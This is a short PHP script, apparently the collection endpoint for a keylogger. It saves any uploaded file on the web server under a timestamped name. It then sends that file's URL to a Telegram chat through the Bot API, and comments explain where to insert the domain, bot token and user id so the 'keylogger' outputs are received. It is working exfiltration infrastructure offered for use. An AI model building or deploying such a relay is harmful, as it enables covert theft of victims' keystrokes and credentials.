<?php

if(isset($_FILES)){
    $date = date("Y-m-d_h:i:sa");
    move_uploaded_file($_FILES["file"]["tmp_name"],"$date.txt");
    $document = "https://<Your-site-domain>/$date.txt"; 
    file_get_contents("https://api.telegram.org/bot<BOT-Token>/sendMessage?chat_id=<User-Id>&text=$document");
}

# Change line 6 <Your-site-domain> to your website domain 
# change line 7 BOt token and your user id to get outputs keylogger